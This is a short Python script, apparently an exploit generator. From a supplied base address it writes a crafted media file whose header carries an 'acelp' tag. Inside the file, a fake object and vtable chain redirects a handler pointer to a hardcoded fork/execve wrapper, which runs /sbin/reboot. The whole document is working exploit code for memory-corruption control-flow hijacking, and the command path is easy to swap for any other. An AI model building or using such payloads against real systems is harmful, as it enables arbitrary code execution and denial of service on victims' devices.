import struct, sys
S=int(sys.argv[1],16)
FN_WRAPPER=0x104044c0
buf=bytearray(24000)
k_f=0;k_a=100;k_b=200;k_v=600
path=b"/sbin/reboot\x00"
buf[k_v:k_v+len(path)]=path                      # V: the path string
buf[k_v+28:k_v+32]=struct.pack(">I",FN_WRAPPER)  # [V+28]=FN (the wrapper)
buf[k_b:k_b+4]=struct.pack(">I",S+6380+k_v)      # [B]=V (vtable ptr AND path ptr)
buf[k_a+8:k_a+12]=struct.pack(">I",S+6380+k_b)   # [A+8]=B
buf[6404:6408]=struct.pack(">I",S+6380+k_a)      # [F+6404]=A
F=S+6380+k_f
buf[23620:23624]=struct.pack(">I",F)             # observer cell: fake handler F
buf[23624:23628]=struct.pack(">I",1)
buf[23628]=1
out=bytearray(bytes([0x57,0x90,0x75,0x36]))
out+=struct.pack(">BII",1,5,5)
out+=struct.pack(">BII",2,0x25,len(buf))
out+=struct.pack(">BII",0,0,0)
out+=b"acelp"+bytes(buf)
open(sys.argv[2],"wb").write(bytes(out))
print(f"wrote {sys.argv[2]}: V4-execve layout, S={S:#x}, FN=0x104044c0 (fork/execve wrapper), path=/sbin/reboot")
